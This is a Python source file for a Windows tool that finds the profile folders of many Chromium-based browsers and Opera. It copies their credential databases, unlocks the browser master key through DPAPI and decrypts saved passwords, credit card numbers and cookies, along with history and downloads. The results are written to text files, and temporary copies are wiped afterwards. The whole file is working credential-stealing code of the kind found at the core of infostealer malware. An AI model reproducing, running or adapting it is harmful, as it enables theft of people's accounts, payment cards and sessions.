import os
import sys
import logging
import sqlite3
import shutil
import json
import base64
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import secrets

# Define browser paths
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

# Define data types and their queries
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt_columns': [2],  # Index of password_value
        'timestamp_columns': []
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Expiration Month', 'Expiration Year', 'Card Number', 'Date Modified'],
        'decrypt_columns': [3],  # Index of card_number_encrypted
        'timestamp_columns': [4]  # date_modified
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt_columns': [3],  # Index of encrypted_value
        'timestamp_columns': [4]  # expires_utc
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt_columns': [],
        'timestamp_columns': [2]  # last_visit_time
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt_columns': [],
        'timestamp_columns': []
    }
}

class BrowserDataExtractor:
    def __init__(self, browser, output_dir=None, verbose=False):
        """Initialize the extractor for a specific browser."""
        if sys.platform != 'win32':
            logging.error("This script is designed for Windows only.")
            raise RuntimeError("This script is designed for Windows only.")
        if browser not in browsers:
            raise ValueError(f"Browser {browser} not supported.")
        self.browser = browser
        self.base_path = browsers[browser]
        if not os.path.exists(self.base_path):
            raise FileNotFoundError(f"Browser data path not found: {self.base_path}")
        self.output_dir = output_dir
        if verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        self.key = None

    def get_master_key(self):
        """Retrieve the master encryption key from Local State."""
        if self.key:
            return self.key
        local_state_path = os.path.join(self.base_path, "Local State")
        if not os.path.exists(local_state_path):
            logging.warning(f"Local State file not found for {self.browser}")
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
                logging.warning(f"No encryption key found in Local State for {self.browser}")
                return None
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            self.key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            logging.info(f"Encryption key retrieved for {self.browser}")
            return self.key
        except Exception as e:
            logging.error(f"Failed to retrieve encryption key for {self.browser}: {e}")
            return None

    def decrypt_data(self, buff, key):
        """Decrypt data using AES GCM or DPAPI fallback."""
        if not buff:
            return ""
        try:
            iv = buff[3:15]
            payload = buff[15:]
            if len(iv) != 12 or len(payload) < 16:
                raise ValueError("Invalid encrypted data format")
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            try:
                return decrypted.decode('utf-8')
            except UnicodeDecodeError:
                return decrypted.hex()
        except Exception as e:
            logging.debug(f"AES decryption failed: {e}, attempting DPAPI fallback.")
            try:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8')
            except Exception:
                logging.warning(f"Decryption failed: {buff.hex()}")
                return buff.hex()

    def convert_chrome_time(self, chrome_time):
        """Convert Chrome timestamp to readable format."""
        if chrome_time == 0 or chrome_time is None:
            return "Never"
        try:
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%Y-%m-%d %H:%M:%S')
        except Exception as e:
            logging.warning(f"Invalid timestamp {chrome_time}: {e}")
            return str(chrome_time)

    def get_profiles(self):
        """Detect available profiles for the browser."""
        profiles = ['Default']
        profile_dir = Path(self.base_path)
        if not profile_dir.exists():
            logging.error(f"Browser data directory not found: {self.base_path}")
            return profiles
        try:
            for item in profile_dir.glob("Profile *"):
                if item.is_dir():
                    profiles.append(item.name)
            logging.debug(f"Detected profiles for {self.browser}: {profiles}")
            return profiles
        except Exception as e:
            logging.error(f"Failed to retrieve profiles: {e}")
            return profiles

    def secure_delete(self, filepath):
        """Securely delete a file by overwriting it with random data."""
        try:
            if not os.path.exists(filepath):
                return
            file_size = os.path.getsize(filepath)
            with open(filepath, "wb") as f:
                f.write(secrets.token_bytes(file_size))
            os.remove(filepath)
            logging.debug(f"Securely deleted {filepath}")
        except Exception as e:
            logging.warning(f"Failed to securely delete {filepath}: {e}")

    def extract_data(self, profile, data_type):
        """Extract specified data type from a profile."""
        if data_type not in data_queries:
            raise ValueError(f"Unknown data type: {data_type}")
        query_info = data_queries[data_type]
        db_file = os.path.join(self.base_path, profile, query_info['file'].lstrip('\\'))
        if not os.path.exists(db_file):
            logging.warning(f"{query_info['file']} not found for {self.browser} profile {profile}")
            return []
        
        temp_db = f"{self.browser}_{profile}_{data_type}_{secrets.token_hex(4)}.db"
        try:
            shutil.copyfile(db_file, temp_db)
        except Exception as e:
            logging.warning(f"Failed to copy {db_file}: {e}")
            return []

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(query_info['query'])
            rows = cursor.fetchall()
            conn.close()
            
            key = self.get_master_key() if query_info['decrypt_columns'] else None
            results = []
            for row in rows:
                row = list(row)
                for idx in query_info['decrypt_columns']:
                    if isinstance(row[idx], bytes):
                        row[idx] = self.decrypt_data(row[idx], key)
                for idx in query_info.get('timestamp_columns', []):
                    if row[idx] is not None:
                        row[idx] = self.convert_chrome_time(row[idx])
                results.append(dict(zip(query_info['columns'], row)))
            logging.info(f"Extracted {len(results)} entries for {data_type} in {self.browser} profile {profile}")
            return results
        except Exception as e:
            logging.error(f"Error extracting {data_type} from {profile}: {e}")
            return []
        finally:
            self.secure_delete(temp_db)

    def save_data(self, data_type, data):
        """Save extracted data to a text file."""
        if not self.output_dir or not data:
            return
        browser_dir = os.path.join(self.output_dir, self.browser)
        os.makedirs(browser_dir, exist_ok=True)
        file_path = os.path.join(browser_dir, f"{data_type}.txt")
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                for entry in data:
                    for key, value in entry.items():
                        f.write(f"{key}: {value}\n")
                    f.write("\n")
            logging.info(f"Saved {data_type} data to {file_path}")
        except Exception as e:
            logging.error(f"Failed to save {data_type} to {file_path}: {e}")

    def run(self):
        """Extract all data types from all profiles and save them."""
        logging.info(f"Starting data extraction for {self.browser}")
        profiles = self.get_profiles()
        all_data = {data_type: [] for data_type in data_queries}
        
        for profile in profiles:
            for data_type in data_queries:
                try:
                    data = self.extract_data(profile, data_type)
                    all_data[data_type].extend(data)
                except Exception as e:
                    logging.error(f"Failed to extract {data_type} from {profile}: {e}")
        
        for data_type, data in all_data.items():
            if data:
                self.save_data(data_type, data)
        logging.info(f"Data extraction completed for {self.browser}")
        return all_data

    @classmethod
    def get_available_browsers(cls):
        """Return a list of installed browsers."""
        available = []
        for browser, path in browsers.items():
            if os.path.exists(os.path.join(path, "Local State")):
                available.append(browser)
        return available
